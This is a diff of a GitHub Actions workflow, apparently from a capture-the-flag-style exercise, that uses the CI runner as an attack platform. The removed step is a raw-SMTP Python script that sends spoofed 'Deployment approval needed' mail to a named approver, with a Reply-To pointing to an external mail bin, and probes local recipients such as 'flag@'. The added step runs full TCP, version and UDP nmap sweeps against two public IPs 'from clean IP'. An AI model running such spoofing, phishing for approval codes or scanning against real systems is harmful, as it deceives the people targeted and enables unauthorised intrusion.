@@ -5,41 +5,15 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: raw smtp transaction
+      - name: full tcp sweep from clean IP
         run: |
-          python3 - <<'PY'
-          import socket,time
-          H,P="4.148.93.130",1025
-          BIN="ff2b05c4-c59f-4580-80da-007cd524c2cf@emailhook.site"
-          def rd(s,n=1.2):
-              time.sleep(n); s.setblocking(False); out=b""
-              try:
-                  while True:
-                      c=s.recv(65535)
-                      if not c: break
-                      out+=c
-              except Exception: pass
-              s.setblocking(True); s.settimeout(25); return out.decode(errors="replace").rstrip()
-          def go(rcpt, subj, frm="cicd@notify.thecontinental.local", extra=""):
-              s=socket.create_connection((H,P),25); s.settimeout(25)
-              print("BANNER:",rd(s))
-              def c(x,n=1.0):
-                  s.sendall((x+"\r\n").encode()); r=rd(s,n); print(f"> {x[:90]}\n< {r}"); return r
-              c("EHLO ci-runner.continental.local")
-              c(f"MAIL FROM:<{frm}>")
-              c(f"RCPT TO:<{rcpt}>")
-              c("DATA")
-              msg=(f"From: {frm}\r\nTo: {rcpt}\r\nSubject: {subj}\r\n{extra}\r\n\r\nPlease activate\r\n.")
-              c(msg,2.5)
-              c("QUIT")
-              s.close(); print("="*70)
-          # 1. deliver to a mailbox I can actually read
-          go(BIN,"Deployment approval needed")
-          # 2. the documented approver
-          go("winston@ztaha45hotmail.onmicrosoft.com","Deployment approval needed",
-             extra=f"Reply-To: {BIN}")
-          # 3. probe interesting local recipients
-          for r in ["flag@notify.thecontinental.local","admin@notify.thecontinental.local",
-                    "root@localhost","postmaster@localhost"]:
-              go(r,"activation code")
-          PY
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq nmap >/dev/null 2>&1
+          echo "############ 4.148.93.130 full"
+          sudo nmap -Pn -n --open -T4 -p- --min-rate 3000 4.148.93.130 || true
+          echo "############ 4.227.70.59 full"
+          sudo nmap -Pn -n --open -T4 -p- --min-rate 3000 4.227.70.59 || true
+          echo "############ service/version on whatever is open"
+          sudo nmap -Pn -n -sV -p 1025 4.148.93.130 || true
+          echo "############ UDP top 50 "
+          sudo nmap -Pn -n --open -sU --top-ports 50 4.148.93.130 || true
